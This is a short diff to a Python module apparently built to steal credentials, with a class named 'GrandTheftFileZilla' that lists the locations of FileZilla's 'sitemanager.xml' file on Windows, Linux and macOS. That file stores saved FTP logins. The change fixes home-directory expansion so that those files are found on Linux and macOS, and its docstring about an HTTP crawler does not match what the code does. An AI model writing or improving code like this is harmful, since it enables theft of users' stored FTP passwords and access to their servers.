@@ -27,6 +27,8 @@ import base64
 import sys
 import os
 
+print()
+
 class GrandTheftFileZilla:
     """The crawler thread executes the HTTP request using the HTTP handler.
 
@@ -43,12 +45,12 @@ class GrandTheftFileZilla:
             os.path.join(os.environ["CSIDL_APPDATA"] if "CSIDL_APPDATA" in os.environ else "", "FileZilla/sitemanager.xml")
         ],
         "linux": [
-            "~/.filezilla/sitemanager.xml",
-            "~/.config/filezilla/sitemanager.xml"
+            os.path.expanduser("~") + "/.filezilla/sitemanager.xml",
+            os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
         ],
         "darwin": [
-            "~/.filezilla/sitemanager.xml",
-            "~/.config/filezilla/sitemanager.xml"
+            os.path.expanduser("~") + "/.filezilla/sitemanager.xml",
+            os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
         ]
     }
 
